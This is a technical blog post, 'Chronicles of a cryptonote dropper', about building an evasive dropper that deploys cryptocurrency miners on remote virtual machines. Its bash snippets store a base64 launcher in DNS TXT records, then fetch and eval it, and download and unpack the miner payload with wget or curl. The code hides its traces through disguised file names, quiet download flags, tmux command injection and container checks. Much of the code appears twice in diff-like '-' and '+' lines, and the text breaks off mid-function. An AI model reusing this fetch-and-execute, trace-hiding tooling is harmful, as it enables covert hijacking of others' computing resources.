hvr-outline-in menu-lang-btn" title="Change website's language"> <button class=langs-dropdown-wrapper > <i class="fas fa-language menu-icons"></i> Lang <div id=langs-dropdown-menu  class=langs-dropdown-content > <ul id=lang-list ><a class=lang-link  id=lang-ar  href="/ar/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-sa"></span>Arabic</a><a class=lang-link  id=lang-bn  href="/bn/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-bd"></span>Bengali</a><a class=lang-link  id=lang-nl  href="/nl/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-nl"></span>Dutch</a><a class=lang-link  id=lang-en  href="/en/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-gb"></span>English</a><a class=lang-link  id=lang-tl  href="/tl/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-ph"></span>Filipino</a><a class=lang-link  id=lang-fr  href="/fr/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-fr"></span>French</a><a class=lang-link  id=lang-de  href="/de/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-de"></span>German</a><a class=lang-link  id=lang-el  href="/el/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-gr"></span>Greek</a><a class=lang-link  id=lang-hi  href="/hi/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-in"></span>Hindi</a><a class=lang-link  id=lang-it  href="/it/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-it"></span>Italian</a><a class=lang-link  id=lang-ja  href="/ja/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-jp"></span>Japanese</a><a class=lang-link  id=lang-jw  href="/jw/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-id"></span>Javanese</a><a class=lang-link  id=lang-ko  href="/ko/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-kr"></span>Korean</a><a class=lang-link  id=lang-ms  href="/ms/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-ms"></span>Malay</a><a class=lang-link  id=lang-zh  href="/zh/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-cn"></span>Mandarin Chinese</a><a class=lang-link  id=lang-pl  href="/pl/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-pl"></span>Polish</a><a class=lang-link  id=lang-pt  href="/pt/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-pt"></span>Portuguese</a><a class=lang-link  id=lang-pa  href="/pa/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-in"></span>Punjabi</a><a class=lang-link  id=lang-ro  href="/ro/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-ro"></span>Romanian</a><a class=lang-link  id=lang-ru  href="/ru/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-ru"></span>Russian</a><a class=lang-link  id=lang-es  href="/es/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-es"></span>Spanish</a><a class=lang-link  id=lang-sv  href="/sv/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-se"></span>Swedish</a><a class=lang-link  id=lang-th  href="/th/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-th"></span>Thai</a><a class=lang-link  id=lang-tr  href="/tr/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-tr"></span>Turkish</a><a class=lang-link  id=lang-uk  href="/uk/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-ua"></span>Ukranian</a><a class=lang-link  id=lang-ur  href="/ur/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-pk"></span>Urdu</a><a class=lang-link  id=lang-vi  href="/vi/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-vn"></span>Vietnamese</a><a class=lang-link  id=lang-zu  href="/zu/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-za"></span>Zulu</a></ul> </div> </button> </ul> </div> </nav> </div> </div> </div> <div> <h1 id=title ><a href="/posts/chronichles_of_a_cryptonote_dropper">Chronicles of a cryptonote dropper</a></h1> <blockquote id=page-description  style="font-style: italic;"> ...How far are you willing to go for...pennies? </blockquote> </div> <div class=franklin-content > <p>Assume you want to mine <a href="https://en.wikipedia.org/wiki/Cryptocurrency">cryptocurrencies</a> on remote <em>virtual</em> hardware. You need to find something to mine. Remote servers means, no <a href="https://en.wikipedia.org/wiki/Application-specific_integrated_circuit">ASICS</a> or GPU proof of work algorithms, basically only <a href="\posts/a-few-notes-on-proof-of-work">CPU friendly coins</a>.</p> <h2 id=the_software ><a href="#the_software" class=header-anchor >The software</a></h2> <p>Search and find a <a href="https://github.com/xmrig/xmrig">miner</a>, but it is not really nice, you would like something you can better control from remote, so you find <a href="https://github.com/Bendr0id/xmrigCC">another miner</a>. You also want a <a href="https://github.com/Bendr0id/xmrigcc-proxy">proxy</a>, because many connections will be short lived, you don&#39;t want to <a href="https://en.wikipedia.org/wiki/Denial-of-service_attack">dos</a> your mining pool. Also a <a href="https://github.com/search?q&#61;tunnel">tunnel</a> would be nice.</p> <h2 id=the_design ><a href="#the_design" class=header-anchor >The design</a></h2> <p>Some botnets use blockchains data to lookup commands, <a href="https://twitter.com/sarahjamielewis">somebody</a> also appears to have <a href="https://web.archive.org/web/https://twitter.com/SarahJamieLewis/status/1185724467776851968">lost bets</a> on this not happening again...anyway we are not that sophisticated, we will get by with some DNS records that store a script that pulls the payload which self extract in a temp directory executes and leaves <em>almost</em> no traces of its setup. Here is a small flow chart which depicts the structure</p> <img src="/assets/posts/output/payload.png" alt=""> <h2 id=launcher ><a href="#launcher" class=header-anchor >Launcher</a></h2> <p>The point of a startup script is to be accessible and easily updatable such that it withstands the test of time. Updating <a href="https://en.wikipedia.org/wiki/Domain_Name_System">DNS</a> records is easy, and DNS is the last thing that gets shutdown within a network..because IP addresses are hard to remember...so chances are it is going to be available most of the times. You see when we are <em>fetching the deployment script</em> we are actually already running some logic, this is the launcher script, it needs the ability to perform DNS queries to lookup our records, DNS might be ubiquitous but <a href="https://web.archive.org/web/20201107155737/https://downloads.isc.org/isc/bind9/">dig</a> is not.</p> <p>There is a little bit of a conundrum here, if we have to download another tool <em>to download another script to download the payload</em> we should just download the payload&#33; In defense...doing this scripty dance adds to obfuscation, allows to keep only one implementation of the launcher &#40;maintainability, yay&#41;, isn&#39;t required most of the times..so we also service a <a href="https://en.wikipedia.org/wiki/Standalone_program">statically linked</a> dig executable to perform dns queries, fetched either by self hosting, or cloud hosting &#40;yes there are fallbacks, like 3 or 4, because cloud services have very minimal free bandwidth, and also require cookies or access tokens...they are very script unfriendly, purposefully so , of course&#41;.</p> <p>What&#39;s in the dns records? We are using <a href="https://en.wikipedia.org/wiki/TXT_record">TXT</a> records, on a custom domain &#40;fallbacks here too&#41;. Why TXT? they happen to be the ones that can store the largest amount of data..usually since it is kind of <a href="https://www.ietf.org/rfc/rfc6763.txt">recommended</a> depending on <em>things</em>. We are specifically using <a href="https://www.cloudflare.com/">cloudflare</a> for our DNS fiddling since it is free, and pretty much the only player in town &#40;<em>well not really but any other alternative pales features wise</em>&#41;. It happens that you can store multiple pieces of data on the <em>same</em> record...this starts getting confusing and scramble for some specifications...&#40;tangent&#41; Cloudflare <a href="https://web.archive.org/save/https://community.cloudflare.com/t/was-there-a-reduction-in-maximum-txt-size">used to</a> allow <em>chained</em> TXT records totaling ~9k bytes, docs now state ~2k bytes, prior to the change I was using ~6k I think, and was serving the script uncompressed, after that I had to thin out the script and compress it before hand &#40;actually I tried to use a <a href="https://freedns.afraid.org/">freedns</a> provider, I was banned within one day, guessing they have a strict no-fat TXT records policy&#41;, however gzip compression appears to NOT be pipe friendly and was still causing problems, so I had to manage to cram the script in without compression &#40;end tangent&#41;.</p> <p>How do we store it? TXT records only support alphanumeric strings, no <a href="https://en.wikipedia.org/wiki/Null_character">NULs</a>, so we have to wrap it into a non null encoding, <a href="https://en.wikipedia.org/wiki/Base64">base64</a> satisfies this constraint, and because we are storing <em>chained</em> TXT records, we have to chunk the output, since we are using shell stuff, this is done through the <code>-w</code> flag, on busybox such flag used to be absent &#40;or opt-in&#41; on older versions which was annoying, an alternative is to use the encoder bundled with openssl, <code>openssl enc -base64</code>.</p> <p>Now that we know how to store our deployment script we store it with either <a href="https://web.archive.org/web/20210305071742/https://github.com/cloudflare/cloudflare-go/blob/master/cmd/flarectl/README.md">cf cli</a> or manually. How do we pull it? We mentioned that we need bindutils or our own <code>dig</code>...after having chosen the serving endpoint, we want to download it, what is available is usually <a href="https://www.gnu.org/software/wget/">wget</a> or <a href="https://curl.se/">curl</a>, wget is found preinstalled much more often, however busybox only provides tls support with dynamic libraries, so you have to make sure the endpoint is serving http or your utility is <code>wget</code> from gnu-utils</p> <pre><code class="bash hljs"><span class=hljs-comment ># the wget command</span>
+wget -t 2 -T 10 -q -i- -O- &gt; <span class=hljs-variable >$filename</span> &lt;&lt;&lt; <span class=hljs-string >&quot;<span class=hljs-variable >$digurl</span>&quot;</span></code></pre> <p>It means try <code>-t2</code> times waiting <code>-T10</code> seconds being <code>-q</code> quiet reading from <code>-i-</code> stdin &#40;<code>&#36;digurl</code>&#41; and writing to <code>-O-</code> stdout &#40;<code>&#36;filename</code>&#41;. This command does not reveal what we are downloading on a first glance. We are going to be very careful with other shell commands for the same reason, or sticking with shell &#40;<a href="https://en.wikipedia.org/wiki/Bash_&#37;28Unix_shell&#37;29">bash</a>&#41; built-ins where possible. Take also care about where you are downloading your executables, you want to ensure you can execute them, since some mount points, especially in containers and <code>tmp</code> paths are <code>noexec</code>. Now that we have our dns querying tool we fetch our records</p> <pre><code class="bash hljs">dig txt <span class=hljs-variable >${record}</span>.<span class=hljs-variable >${zone}</span> +short +tcp +timeout=3 +retries=0 <span class=hljs-variable >$dnsserver</span></code></pre>
 <p>Flags are self explanatory here, <code>&#43;short</code> just means that we are only interested in the data itself, so that we don&#39;t have to parse the output. It&#39;s important to specify the DNS server, like google &#40;<code>8.8.8.8</code>&#41; or cloudflare &#40;<code>1.1.1.1</code>&#41; ones because many environments redirect or proxy dns queries to their own dns servers by default. After having fetched the chunked script we deal with quotes and whitespaces to make it ready for decoding</p>
-<pre><code class="bash hljs">data=<span class="hljs-variable">${data//\&quot;}</span> <span class="hljs-comment"># remove quotes</span>
-data=<span class="hljs-variable">${data// }</span> <span class="hljs-comment"># remove whitespace</span>
-<span class="hljs-built_in">declare</span> -a ar_data
-<span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-variable">$data</span>; <span class="hljs-keyword">do</span>
-    ar_data[<span class="hljs-variable">${l:0:1}</span>]=<span class="hljs-variable">${l:1}</span> <span class="hljs-comment"># iterate over each line and remove the first characther</span>
-<span class="hljs-keyword">done</span>
-data=<span class="hljs-variable">${ar_data[@]}</span> <span class="hljs-comment"># join all the lines</span>
-data=<span class="hljs-variable">${data// }</span> <span class="hljs-comment"># ensure joining didn&#x27;t add whitespace</span>
-<span class="hljs-comment"># decode</span>
-launcher=$(<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$launcher</span>&quot;</span> | <span class="hljs-variable">$b64</span> -d -w <span class="hljs-variable">$chunksize</span>)</code></pre>
+<pre><code class="bash hljs">data=<span class=hljs-variable >${data//\&quot;}</span> <span class=hljs-comment ># remove quotes</span>
+data=<span class=hljs-variable >${data// }</span> <span class=hljs-comment ># remove whitespace</span>
+<span class=hljs-built_in >declare</span> -a ar_data
+<span class=hljs-keyword >for</span> l <span class=hljs-keyword >in</span> <span class=hljs-variable >$data</span>; <span class=hljs-keyword >do</span>
+    ar_data[<span class=hljs-variable >${l:0:1}</span>]=<span class=hljs-variable >${l:1}</span> <span class=hljs-comment ># iterate over each line and remove the first characther</span>
+<span class=hljs-keyword >done</span>
+data=<span class=hljs-variable >${ar_data[@]}</span> <span class=hljs-comment ># join all the lines</span>
+data=<span class=hljs-variable >${data// }</span> <span class=hljs-comment ># ensure joining didn&#x27;t add whitespace</span>
+<span class=hljs-comment ># decode</span>
+launcher=$(<span class=hljs-built_in >echo</span> <span class=hljs-string >&quot;<span class=hljs-variable >$launcher</span>&quot;</span> | <span class=hljs-variable >$b64</span> -d -w <span class=hljs-variable >$chunksize</span>)</code></pre>
 <p>What if now we <em>still</em> don&#39;t have our launcher? DNS is messy, we want a fallback, lets setup a subdomain to fetch the launcher script directly. Before evaluating our script we want to customize it, with some variables, again lets use a TXT record to store a NAME&#61;VALUE list of variables and parse it. There is also a fallback for variables, cloudflare offers redirects based on URLs, these redirects are served <em>before</em> the destination, so we don&#39;t need an endpoint, we just want to configure regex based redirect rules to a fictitious endpoint, what we are interested in are the parameters of the url <code>?NAME&#61;VALUE&amp;NAME2&#61;VALUE2...</code>, so that we can parametrize our launcher simply by changing the redirect url, always with attention to quoting and escapes codes</p>
-<pre><code class="bash hljs"><span class="hljs-comment">## m1 also important to stop wget</span>
-pl_vars=$(<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$token_url</span>&quot;</span> | wget -t 1 -T 3 -q -i- -S 2&gt;&amp;1 | grep -m1 <span class="hljs-string">&#x27;Location&#x27;</span>)
-pl_vars=<span class="hljs-variable">${pl_vars#*\/}</span>
-pl_vars=<span class="hljs-variable">${pl_vars//\&quot;&amp;/\&quot; }</span>
-pl_vars=<span class="hljs-variable">${pl_vars//%3F/\?}</span></code></pre>
+<pre><code class="bash hljs"><span class=hljs-comment >## m1 also important to stop wget</span>
+pl_vars=$(<span class=hljs-built_in >echo</span> <span class=hljs-string >&quot;<span class=hljs-variable >$token_url</span>&quot;</span> | wget -t 1 -T 3 -q -i- -S 2&gt;&amp;1 | grep -m1 <span class=hljs-string >&#x27;Location&#x27;</span>)
+pl_vars=<span class=hljs-variable >${pl_vars#*\/}</span>
+pl_vars=<span class=hljs-variable >${pl_vars//\&quot;&amp;/\&quot; }</span>
+pl_vars=<span class=hljs-variable >${pl_vars//%3F/\?}</span></code></pre>
 <p>The wget <code>-S</code> prints the redirect url we are interested in for parsing. Having the parameters and the script, we evaluate the variables writing them over a file</p>
-<pre><code class="bash hljs"><span class="hljs-built_in">eval</span> <span class="hljs-string">&quot;<span class="hljs-variable">$pl_vars</span>&quot;</span>
-<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;export \
-<span class="hljs-variable">$pl_vars</span> \
-<span class="hljs-variable">$ENV_VARS</span> \
+<pre><code class="bash hljs"><span class=hljs-built_in >eval</span> <span class=hljs-string >&quot;<span class=hljs-variable >$pl_vars</span>&quot;</span>
+<span class=hljs-built_in >echo</span> <span class=hljs-string >&quot;export \
+<span class=hljs-variable >$pl_vars</span> \
+<span class=hljs-variable >$ENV_VARS</span> \
 &quot;</span>&gt;env.sh</code></pre>
 <p>This file will be sourced by are deploy script. The last part of the startup script is to actual <a href="https://en.wikipedia.org/wiki/Trampoline_&#40;computing&#41;">trampoline</a>, evaluate the script within the current shell process, or maybe let it be managed by tmux if possible.</p>
-<pre><code class="bash hljs"><span class="hljs-comment"># printf preserves quotes</span>
-<span class="hljs-built_in">eval</span> <span class="hljs-string">&quot;<span class="hljs-subst">$(printf &#x27;%s&#x27; <span class="hljs-string">&quot;<span class="hljs-variable">$launcher</span>&quot;</span>)</span>&quot;</span> &amp;&gt;/dev/null
-<span class="hljs-comment"># or tmux</span>
-<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$launcher</span>&quot;</span> &gt; <span class="hljs-string">&quot;.. &quot;</span>
-tmux send-keys -t miner <span class="hljs-string">&quot;. ./\&quot;.. \&quot;&quot;</span> Enter</code></pre>
+<pre><code class="bash hljs"><span class=hljs-comment ># printf preserves quotes</span>
+<span class=hljs-built_in >eval</span> <span class=hljs-string >&quot;<span class=hljs-subst >$(printf &#x27;%s&#x27; <span class=hljs-string >&quot;<span class=hljs-variable >$launcher</span>&quot;</span>)</span>&quot;</span> &amp;&gt;/dev/null
+<span class=hljs-comment ># or tmux</span>
+<span class=hljs-built_in >echo</span> <span class=hljs-string >&quot;<span class=hljs-variable >$launcher</span>&quot;</span> &gt; <span class=hljs-string >&quot;.. &quot;</span>
+tmux send-keys -t miner <span class=hljs-string >&quot;. ./\&quot;.. \&quot;&quot;</span> Enter</code></pre>
 <p>The launcher script is dumped to a file named &quot;.. &quot; this looks confusing because it can be mistaken as a <em>parent</em> directory. And we don&#39;t include the session command, as that would linger in the process command, instead we start the tmux session beforehand and send the source command through tmux terminal interface. Related to this, sometimes calling an executable with <code>./</code> keeps those chars in the command, so it is better to add the <code>&#36;PWD</code> to the path..<code>PATH&#61;&#36;PWD:&#36;PATH</code>.</p>
-<h2 id="the_payload"><a href="#the_payload" class="header-anchor">The Payload</a></h2>
+<h2 id=the_payload ><a href="#the_payload" class=header-anchor >The Payload</a></h2>
 <p>Our deploy script starts by sourcing the <code>env.sh</code> file, and keeping or configured vars as <code>STARTING_*</code> vars like</p>
-<pre><code class="bash hljs">STARTING_PATH=<span class="hljs-variable">${STARTING_PATH:-<span class="hljs-variable">$PATH</span>}</span>
-STARTING_PID=<span class="hljs-variable">$BASHPID</span></code></pre>
+<pre><code class="bash hljs">STARTING_PATH=<span class=hljs-variable >${STARTING_PATH:-<span class=hljs-variable >$PATH</span>}</span>
+STARTING_PID=<span class=hljs-variable >$BASHPID</span></code></pre>
 <p>This allows us to kill and restart a running instance while resetting the environment. Lets switch to a tmp directory with exec capabilities</p>
-<pre><code class="bash hljs"><span class="hljs-comment"># out local subdirectory</span>
-pathname=$(<span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;.%-<span class="hljs-subst">$((RANDOM%9+1)</span>)s&quot;</span>
-<span class="hljs-keyword">for</span> ph <span class="hljs-keyword">in</span> {/tmp,/dev/shm,/run,/var/tmp,/var/cache,~/.<span class="hljs-built_in">local</span>,~/.cache,~/}; <span class="hljs-keyword">do</span>
-    rm -rf <span class="hljs-string">&quot;<span class="hljs-variable">$ph</span>/<span class="hljs-variable">$pathname</span>&quot;</span> &amp;&amp;
-        mkdir -p <span class="hljs-string">&quot;<span class="hljs-variable">$ph</span>/<span class="hljs-variable">$pathname</span>&quot;</span> &amp;&amp;
-        tmppath=<span class="hljs-string">&quot;<span class="hljs-variable">$ph</span>/<span class="hljs-variable">$pathname</span>&quot;</span> &amp;&amp;
-        is_path_executable <span class="hljs-string">&quot;<span class="hljs-variable">$tmppath</span>&quot;</span> &amp;&amp;
-        <span class="hljs-built_in">export</span> PATH=<span class="hljs-string">&quot;<span class="hljs-variable">${ph}</span>/<span class="hljs-variable">$pathname</span>:<span class="hljs-variable">${PATH}</span>&quot;</span> tmppath &amp;&amp;
-        <span class="hljs-built_in">break</span>
-<span class="hljs-keyword">done</span>
-[ -n <span class="hljs-string">&quot;<span class="hljs-variable">$tmppath</span>&quot;</span> ] &amp;&amp; <span class="hljs-built_in">cd</span> <span class="hljs-string">&quot;<span class="hljs-variable">$tmppath</span>&quot;</span></code></pre>
+<pre><code class="bash hljs"><span class=hljs-comment ># out local subdirectory</span>
+pathname=$(<span class=hljs-built_in >printf</span> <span class=hljs-string >&quot;.%-<span class=hljs-subst >$((RANDOM%9+1)</span>)s&quot;</span>
+<span class=hljs-keyword >for</span> ph <span class=hljs-keyword >in</span> {/tmp,/dev/shm,/run,/var/tmp,/var/cache,~/.<span class=hljs-built_in >local</span>,~/.cache,~/}; <span class=hljs-keyword >do</span>
+    rm -rf <span class=hljs-string >&quot;<span class=hljs-variable >$ph</span>/<span class=hljs-variable >$pathname</span>&quot;</span> &amp;&amp;
+        mkdir -p <span class=hljs-string >&quot;<span class=hljs-variable >$ph</span>/<span class=hljs-variable >$pathname</span>&quot;</span> &amp;&amp;
+        tmppath=<span class=hljs-string >&quot;<span class=hljs-variable >$ph</span>/<span class=hljs-variable >$pathname</span>&quot;</span> &amp;&amp;
+        is_path_executable <span class=hljs-string >&quot;<span class=hljs-variable >$tmppath</span>&quot;</span> &amp;&amp;
+        <span class=hljs-built_in >export</span> PATH=<span class=hljs-string >&quot;<span class=hljs-variable >${ph}</span>/<span class=hljs-variable >$pathname</span>:<span class=hljs-variable >${PATH}</span>&quot;</span> tmppath &amp;&amp;
+        <span class=hljs-built_in >break</span>
+<span class=hljs-keyword >done</span>
+[ -n <span class=hljs-string >&quot;<span class=hljs-variable >$tmppath</span>&quot;</span> ] &amp;&amp; <span class=hljs-built_in >cd</span> <span class=hljs-string >&quot;<span class=hljs-variable >$tmppath</span>&quot;</span></code></pre>
 <p>Checking if within a <a href="https://en.wikipedia.org/wiki/OS-level_virtualization">container</a> is also handy, we can probe the filesystem for hints</p>
-<pre><code class="bash hljs">c=$(<span class="hljs-built_in">builtin</span> compgen -G <span class="hljs-string">&#x27;/etc/cpa*&#x27;</span>)
-d=$(<span class="hljs-built_in">builtin</span> compgen -G <span class="hljs-string">&#x27;/dev/*&#x27;</span>)
-s=$(<span class="hljs-built_in">builtin</span> compgen -G <span class="hljs-string">&#x27;/sys/*&#x27;</span>)
-p=$(<span class="hljs-built_in">builtin</span> compgen -G <span class="hljs-string">&#x27;/proc/*&#x27;</span>)
+<pre><code class="bash hljs">c=$(<span class=hljs-built_in >builtin</span> compgen -G <span class=hljs-string >&#x27;/etc/cpa*&#x27;</span>)
+d=$(<span class=hljs-built_in >builtin</span> compgen -G <span class=hljs-string >&#x27;/dev/*&#x27;</span>)
+s=$(<span class=hljs-built_in >builtin</span> compgen -G <span class=hljs-string >&#x27;/sys/*&#x27;</span>)
+p=$(<span class=hljs-built_in >builtin</span> compgen -G <span class=hljs-string >&#x27;/proc/*&#x27;</span>)
 jail=
-<span class="hljs-keyword">if</span> [ -n <span class="hljs-string">&quot;<span class="hljs-variable">$c</span>&quot;</span> -o -z <span class="hljs-string">&quot;<span class="hljs-variable">$d</span>&quot;</span> -o -z <span class="hljs-string">&quot;<span class="hljs-variable">$s</span>&quot;</span> -o -z <span class="hljs-string">&quot;<span class="hljs-variable">$p</span>&quot;</span> ]; <span class="hljs-keyword">then</span> <span class="hljs-comment">## we are in a jail</span>
+<span class=hljs-keyword >if</span> [ -n <span class=hljs-string >&quot;<span class=hljs-variable >$c</span>&quot;</span> -o -z <span class=hljs-string >&quot;<span class=hljs-variable >$d</span>&quot;</span> -o -z <span class=hljs-string >&quot;<span class=hljs-variable >$s</span>&quot;</span> -o -z <span class=hljs-string >&quot;<span class=hljs-variable >$p</span>&quot;</span> ]; <span class=hljs-keyword >then</span> <span class=hljs-comment >## we are in a jail</span>
     jail=1
-<span class="hljs-keyword">fi</span></code></pre>
+<span class=hljs-keyword >fi</span></code></pre>
 <p>Now it&#39;s time to download our payload, we choose to support both wget and curl, we already know how to use wget with careful flags, for curl it is a little bit different. We have to create a config file, and override <code>CURL_HOME</code></p>
-<pre><code class="bash hljs"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;url = <span class="hljs-variable">$uri</span>
-output = <span class="hljs-variable">${name}</span><span class="hljs-variable">${format}</span>
+<pre><code class="bash hljs"><span class=hljs-built_in >echo</span> <span class=hljs-string >&quot;url = <span class=hljs-variable >$uri</span>
+output = <span class=hljs-variable >${name}</span><span class=hljs-variable >${format}</span>
 connect-timeout = 10
 &quot;</span> &gt; .curlrc
-CURL_HOME=<span class="hljs-variable">$PWD</span> curl -sOL</code></pre>
+CURL_HOME=<span class=hljs-variable >$PWD</span> curl -sOL</code></pre>
 <p>Last step is just to extract the payload</p>
-<pre><code class="bash hljs"><span class="hljs-built_in">type</span> unzip &amp;&gt;/dev/null &amp;&amp;
-    format=<span class="hljs-string">&quot;.zip&quot;</span> extract=<span class="hljs-string">&quot;unzip -q&quot;</span> ||
-        format=<span class="hljs-string">&quot;.tar.gz&quot;</span> extract=<span class="hljs-string">&quot;tar xf&quot;</span></code></pre>
+<pre><code class="bash hljs"><span class=hljs-built_in >type</span> unzip &amp;&gt;/dev/null &amp;&amp;
+    format=<span class=hljs-string >&quot;.zip&quot;</span> extract=<span class=hljs-string >&quot;unzip -q&quot;</span> ||
+        format=<span class=hljs-string >&quot;.tar.gz&quot;</span> extract=<span class=hljs-string >&quot;tar xf&quot;</span></code></pre>
 <p>It is worth mentioning the use of a &#91;CDN&#93; for servicing the payload. Here again cloudflare to the rescue saves us from bandwidth expenditures. By simply renaming our compressed payload with a <em>file extension</em> supported by cloudflare...it becomes cached. Cloudflare doesn&#39;t check the headers of what it is servicing, maybe because doing so at that scale is simply impractical.</p>
-<h2 id="adventures_down_bashland"><a href="#adventures_down_bashland" class="header-anchor">Adventures down Bashland</a></h2>
+<h2 id=adventures_down_bashland ><a href="#adventures_down_bashland" class=header-anchor >Adventures down Bashland</a></h2>
 <p>Bash was chosen with the assumption that is portable, doesn&#39;t look too out of place and is more ubiquitous compared to other scripting languages such perl, ruby or python. The truth is that a standalone binary written in golang or lua would have been much easier, with less bugs, and easier to maintain, basically bash was the worst choice possible, in my defense, by the time that I scratched so many itches with bash, it was too late for a rewrite, and it was also getting kind of boring.</p>
 <p>There was also the option to use busybox with the compile time flag to use all builtins &#40;like grep and sed&#41;, however using builtins this way doesn&#39;t allow to spawn jobs &#40;fork&#41; and exposes the daemon to potential deadlocks.</p>
 <p>I will describe some bash functions here, with the full list available <a href="\assets/posts/bash_functions.txt">here</a></p>
-<pre><code class="bash hljs"><span class="hljs-comment">## echo a string long $1 of random lowercase chars</span>
-<span class="hljs-function"><span class="hljs-title">rand_string</span></span>() {
-    <span class="hljs-built_in">local</span> c=0
-    <span class="hljs-keyword">while</span> [ <span class="hljs-variable">$c</span> -lt <span class="hljs-variable">$1</span> ]; <span class="hljs-keyword">do</span>
-        <span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;\x<span class="hljs-subst">$(printf &#x27;%x&#x27; $((97+RANDOM%25)</span>))&quot;</span>
-        c=$((c+<span class="hljs-number">1</span>))
-    <span class="hljs-keyword">done</span>
+<pre><code class="bash hljs"><span class=hljs-comment >## echo a string long $1 of random lowercase chars</span>
+<span class=hljs-function ><span class=hljs-title >rand_string</span></span>() {
+    <span class=hljs-built_in >local</span> c=0
+    <span class=hljs-keyword >while</span> [ <span class=hljs-variable >$c</span> -lt <span class=hljs-variable >$1</span> ]; <span class=hljs-keyword >do</span>
+        <span class=hljs-built_in >printf</span> <span class=hljs-string >&quot;\x<span class=hljs-subst >$(printf &#x27;%x&#x27; $((97+RANDOM%25)</span>))&quot;</span>
+        c=$((c+<span class=hljs-number >1</span>))
+    <span class=hljs-keyword >done</span>
 }</code></pre>
 <p>Use the <code>RANDOM</code> variable to get a number between 97-122 corresponding to a character code, printf should be a builtin, we don&#39;t want to fork within a loop.</p>
-<pre><code class="bash hljs"><span class="hljs-comment">## make a new file descriptor named $1</span>
-<span class="hljs-function"><span class="hljs-title">newfd</span></span>() {
-    <span class="hljs-built_in">eval</span> <span class="hljs-string">&quot;local fd=\${<span class="hljs-variable">$1</span>}&quot;</span>
-    <span class="hljs-built_in">eval</span> <span class="hljs-string">&quot;exec <span class="hljs-variable">$fd</span>&gt;&amp;-&quot;</span> &amp;&gt;/dev/null
-    <span class="hljs-built_in">local</span> pp=<span class="hljs-string">&quot;.<span class="hljs-subst">$(rand_string 8)</span>&quot;</span>
-    mkfifo <span class="hljs-variable">$pp</span>
-    <span class="hljs-built_in">unset</span> <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span>
-    <span class="hljs-built_in">eval</span> <span class="hljs-string">&quot;exec {<span class="hljs-variable">$1</span>}&lt;&gt;<span class="hljs-variable">$pp</span>&quot;</span>
-    <span class="hljs-comment"># unlink the named pipe</span>
-    rm -f <span class="hljs-variable">$pp</span>
+<pre><code class="bash hljs"><span class=hljs-comment >## make a new file descriptor named $1</span>
+<span class=hljs-function ><span class=hljs-title >newfd</span></span>() {
+    <span class=hljs-built_in >eval</span> <span class=hljs-string >&quot;local fd=\${<span class=hljs-variable >$1</span>}&quot;</span>
+    <span class=hljs-built_in >eval</span> <span class=hljs-string >&quot;exec <span class=hljs-variable >$fd</span>&gt;&amp;-&quot;</span> &amp;&gt;/dev/null
+    <span class=hljs-built_in >local</span> pp=<span class=hljs-string >&quot;.<span class=hljs-subst >$(rand_string 8)</span>&quot;</span>
+    mkfifo <span class=hljs-variable >$pp</span>
+    <span class=hljs-built_in >unset</span> <span class=hljs-string >&quot;<span class=hljs-variable >$1</span>&quot;</span>
+    <span class=hljs-built_in >eval</span> <span class=hljs-string >&quot;exec {<span class=hljs-variable >$1</span>}&lt;&gt;<span class=hljs-variable >$pp</span>&quot;</span>
+    <span class=hljs-comment ># unlink the named pipe</span>
+    rm -f <span class=hljs-variable >$pp</span>
 }</code></pre>
 <p>Leverage pipes to create anonymous file descriptors, these don&#39;t behave exactly like file descriptors but they are good enough for <a href="https://en.wikipedia.org/wiki/Inter-process_communication">IPC</a>.</p>
-<pre><code class="bash hljs"><span class="hljs-comment">## https://unix.stackexchange.com/a/407383/163931</span>
-<span class="hljs-function"><span class="hljs-title">fleep</span></span>()
+<pre><code class="bash hljs"><span class=hljs-comment >## https://unix.stackexchange.com/a/407383/163931</span>
+<span class=hljs-function ><span class=hljs-title >fleep</span></span>()
 {
-    <span class="hljs-comment"># log &quot;fleep: called by ${FUNCNAME[1]}&quot;</span>
-    [ -n <span class="hljs-string">&quot;<span class="hljs-variable">${_snore_fd}</span>&quot;</span> -a <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span> != 0 ] ||
+    <span class=hljs-comment ># log &quot;fleep: called by ${FUNCNAME[1]}&quot;</span>
+    [ -n <span class=hljs-string >&quot;<span class=hljs-variable >${_snore_fd}</span>&quot;</span> -a <span class=hljs-string >&quot;<span class=hljs-variable >$1</span>&quot;</span> != 0 ] ||
         newfd _snore_fd
-    <span class="hljs-comment"># log &quot;fleep: starting waiting with ${_snore_fd}&quot;</span>
